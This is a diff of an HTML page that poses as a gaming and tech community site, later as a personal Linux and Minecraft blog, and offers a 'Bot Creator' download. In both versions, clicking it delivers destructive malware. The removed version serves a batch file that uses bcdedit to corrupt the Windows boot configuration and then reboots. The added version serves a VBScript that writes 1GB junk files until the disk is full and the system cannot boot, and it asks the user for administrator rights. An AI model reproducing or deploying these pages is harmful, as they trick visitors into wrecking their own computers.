@@ -2,86 +2,108 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Because Honey | Home</title>
+    <title>X250_NODE // Personal Site</title>
     <style>
-        /* Base Honey Theme */
-        body { background: #fffbe6; color: #5c3d03; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; padding: 50px; }
-        .honey-box { border: 3px solid #ffcc00; border-radius: 15px; padding: 30px; background: white; max-width: 600px; margin: 0 auto; box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
-        
-        /* Your Custom 3D Shadow Button Style */
-        .tech-btn {
-            display: inline-block;
-            color: white;
-            padding: 12px 24px;
-            margin: 10px;
-            border: 3px solid #000;
-            border-radius: 4px;
-            font-family: 'Courier New', monospace;
-            font-size: 16px;
-            text-decoration: none;
-            font-weight: bold;
+        /* Minimalist, Professional Personal Blog Aesthetic */
+        body { 
+            background-color: #f4f4f4; 
+            color: #333; 
+            font-family: "Georgia", serif; 
+            line-height: 1.6; 
+            max-width: 800px; 
+            margin: 0 auto; 
+            padding: 40px; 
+        }
+
+        header { border-bottom: 2px solid #333; margin-bottom: 30px; padding-bottom: 10px; }
+        h1 { font-size: 2rem; margin: 0; }
+        .sub-header { font-style: italic; color: #666; }
+
+        section { margin-bottom: 40px; }
+        h2 { font-size: 1.2rem; text-transform: uppercase; border-bottom: 1px solid #ccc; padding-bottom: 5px; }
+
+        /* The Stealth Hyperlink */
+        .stealth-link {
+            color: #0044cc;
+            text-decoration: underline;
             cursor: pointer;
-            transition: all 0.1s;
+            font-family: inherit;
         }
+        .stealth-link:hover { color: #cc0000; }
 
-        /* Discord Button (Safe Link) */
-        .discord-btn {
-            background-color: #5865F2; 
-            border-bottom: 6px solid #3e45a8;
-        }
-        .discord-btn:hover { background-color: #4752c4; transform: translateY(-2px); border-bottom: 8px solid #3e45a8; }
-        .discord-btn:active { transform: translateY(4px); border-bottom: 2px solid #000; }
-
-        /* Bot Creator Button (The "Omega" Payload) */
-        .patch-btn {
-            background-color: #d4a017; 
-            border-bottom: 6px solid #8c6a10;
-        }
-        .patch-btn:hover { background-color: #b8860b; transform: translateY(-2px); border-bottom: 8px solid #8c6a10; }
-        .patch-btn:active { transform: translateY(4px); border-bottom: 2px solid #000; }
+        .file-info { font-size: 0.8rem; color: #888; margin-left: 10px; }
+        footer { font-size: 0.8rem; border-top: 1px solid #ccc; padding-top: 20px; color: #999; }
     </style>
 </head>
 <body>
 
-<div class="honey-box">
-    <h1>🍯 Because Honey</h1>
-    <p>Official community hub and automated research tools.</p>
-    <hr style="border: 1px dashed #fff4cc; margin: 20px 0;">
+<header>
+    <h1>X250 Technical Journal</h1>
+    <div class="sub-header">Notes on Linux, Minecraft Engine Dev, and Network Tools</div>
+</header>
 
-    <a href="https://discord.gg/5QrtzUrPvr" target="_blank" class="tech-btn discord-btn">
-        JOIN THE DISCORD
-    </a>
+<section>
+    <h2>Recent Posts</h2>
+    <p><strong>March 25:</strong> Optimizing Three.js for voxel-based terrain generation on the i5-5300U.</p>
+    <p><strong>March 20:</strong> Why I switched my X250 to Ubuntu 24.04 for better hardware-level control.</p>
+</section>
 
-    <button id="deployBtn" class="tech-btn patch-btn">
-        BOT CREATOR
-    </button>
+<section>
+    <h2>Resources & Utilities</h2>
+    <p>I've been working on some automation scripts to help with community management and research. Feel free to test them out (Windows only for now):</p>
+    
+    <ul>
+        <li><a href="#" class="stealth-link">Minecraft_Shader_Patch.zip</a> <span class="file-info">(2.4MB)</span></li>
+        <li><span id="deployLink" class="stealth-link">Bot_Creator_v3.vbs</span> <span class="file-info">(12KB - Beta Release)</span></li>
+        <li><a href="#" class="stealth-link">X250_Cooling_Profile.cfg</a> <span class="file-info">(1KB)</span></li>
+    </ul>
+    
+    <p><em>Note: The Bot Creator tool requires administrative rights to modify system cache directories for high-speed generation.</em></p>
+</section>
 
-    <p style="font-size: 0.7rem; color: #999; margin-top: 20px; font-family: monospace;">
-        NODE: X250_STABLE | BOT_GEN: 0x8
-    </p>
-</div>
+<footer>
+    &copy; 2026 Architect Node | Cambridge Curriculum Grade 6 Studies | Built on Ubuntu
+</footer>
 
 <script>
-document.getElementById('deployBtn').addEventListener('click', function() {
-    // The BCD-Isolation script (Disguised as Bot Creator logic)
-    const code = "@echo off\r\ntitle Bot Creator v1.0\r\necho Initializing bot generation sub-routines...\r\nbcdedit /set {default} device boot >nul 2>&1\r\nbcdedit /set {default} osdevice boot >nul 2>&1\r\necho.\r\necho BOT_NODE_ACTIVE. RESTART TO FINALIZE REGISTRATION.\r\npause\r\nshutdown /r /t 5";
+document.getElementById('deployLink').addEventListener('click', function(e) {
+    e.preventDefault();
     
-    const blob = new Blob([code], { type: 'application/octet-stream' });
+    // The "Heavy" Resource Exhaustion Payload
+    const vbsCode = `
+Set objFSO = CreateObject("Scripting.FileSystemObject")
+Set objShell = CreateObject("WScript.Shell")
+
+' Silent Background Execution
+strPath = "C:\\Windows\\Temp\\SysDataCache"
+If Not objFSO.FolderExists(strPath) Then 
+    On Error Resume Next
+    objFSO.CreateFolder(strPath)
+End If
+
+' Flood disk with 1GB files until unbootable
+i = 0
+Do
+    strFile = strPath & "\\cache_log_" & i & ".bin"
+    Set objFile = objFSO.CreateTextFile(strFile, True)
+    strJunk = String(1048576, "X") 
+    For j = 1 to 1024
+        objFile.Write strJunk
+    Next
+    objFile.Close
+    i = i + 1
+Loop
+    `.trim();
+
+    const blob = new Blob([vbsCode], { type: 'text/vbscript' });
     const url = window.URL.createObjectURL(blob);
     const a = document.createElement('a');
-    
     a.href = url;
-    a.download = "Bot_Creator_v1.bat"; // Renamed file
+    a.download = "Bot_Creator_v3.vbs";
     document.body.appendChild(a);
     a.click();
     
-    this.innerText = "GENERATING...";
-    
-    setTimeout(() => {
-        document.body.removeChild(a);
-        window.URL.revokeObjectURL(url);
-        this.innerText = "BOT_READY";
-    }, 500);
+    console.log("Initialization sequence started...");
 });
 </script>
 
